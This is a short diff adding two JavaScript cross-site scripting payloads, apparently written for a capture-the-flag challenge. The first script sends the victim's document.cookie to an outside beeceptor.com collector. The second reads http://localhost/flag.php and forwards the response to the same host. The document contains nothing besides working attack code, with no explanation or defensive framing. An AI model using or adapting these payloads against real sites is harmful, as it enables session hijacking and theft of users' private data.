@@ -1,0 +1,19 @@
+<script>
+var x = new XMLHttpRequest();
+x.open("GET", "https://loop5.free.beeceptor.com/cookie?" + document.cookie);
+x.send();
+</script>
+
+
+<script>
+var x = new XMLHttpRequest();
+x.onreadystatechange = function() {
+    if (x.readyState === XMLHttpRequest.DONE) {
+        var y = new XMLHttpRequest();
+        y.open("GET", "https://loop5.free.beeceptor.com/flag=" + x.responseText);
+        y.send();
+    }
+};
+x.open("GET", "http://localhost/flag.php")
+x.send()
+</script>
